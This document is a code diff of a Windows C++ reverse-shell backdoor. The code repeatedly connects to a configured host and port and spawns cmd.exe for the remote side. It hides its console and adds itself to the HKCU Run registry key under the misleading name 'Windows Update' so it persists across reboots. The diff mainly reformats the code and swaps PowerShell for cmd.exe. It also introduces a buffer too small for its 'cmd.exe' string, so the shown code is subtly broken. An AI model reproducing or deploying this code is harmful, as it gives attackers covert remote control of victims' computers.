@@ -2,13 +2,16 @@
 #include <windows.h>
 #include <ws2tcpip.h>
 #include <string>
+
 #pragma comment(lib, "Ws2_32.lib")
-#define DEFAULT_BUFLEN 1024
+
+using namespace std;
 
 
-void RunShell(char* ip, int port) {
-    while (true) {
-
+void RunShell(char* ip, int port) 
+{
+    while (true)
+   	{
         SOCKET mySocket;
         sockaddr_in addr;
         WSADATA version;
@@ -19,22 +22,26 @@ void RunShell(char* ip, int port) {
         addr.sin_addr.s_addr = inet_addr(ip);
         addr.sin_port = htons(port);
 
-        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
+        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) 
+        {
             closesocket(mySocket);
             WSACleanup();
             continue;
         }
-        else {
-            char RecvData[DEFAULT_BUFLEN];
-            memset(RecvData, 0, sizeof(RecvData));
-            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
-            if (RecvCode <= 0) {
+        else 
+        {
+            char data[1024];
+            memset(data, 0, sizeof(data));
+            int code = recv(mySocket, data, 1024, 0);
+            if (code <= 0) 
+            {
                 closesocket(mySocket);
                 WSACleanup();
                 continue;
             }
-            else {
-                char Process[15] = "powershell.exe";
+            else 
+            {
+                char ProcessName[7] = "cmd.exe";
                 STARTUPINFO sinfo;
                 PROCESS_INFORMATION pinfo;
                 memset(&sinfo, 0, sizeof(sinfo));
@@ -46,25 +53,26 @@ void RunShell(char* ip, int port) {
                 CloseHandle(pinfo.hProcess);
                 CloseHandle(pinfo.hThread);
 
-                memset(RecvData, 0, sizeof(RecvData));
-                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
-                if (RecvCode <= 0) {
+                memset(data, 0, sizeof(data));
+                int code = recv(mySocket, data, 1024, 0);
+                if (code <= 0) 
+                {
                     closesocket(mySocket);
                     WSACleanup();
                     continue;
-                }
-                
+                }       
             }
         }
     }
 }
 
-int main(int argc, char** argv) {
+int main(int argc, char** argv) 
+{
     FreeConsole();
 
     HKEY hkey = NULL;
     LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);     
-    LONG status = RegSetValueEx(hkey, "Windows Update", 0, REG_SZ, (BYTE*)argv[0], (std::string(argv[0]).size() + 1) * sizeof(wchar_t));
+    LONG status = RegSetValueEx(hkey, "Windows Update", 0, REG_SZ, (BYTE*)argv[0], (string(argv[0]).size() + 1) * sizeof(wchar_t));
 
     char host[] = "localhost";
     int port = 0xDEAD;
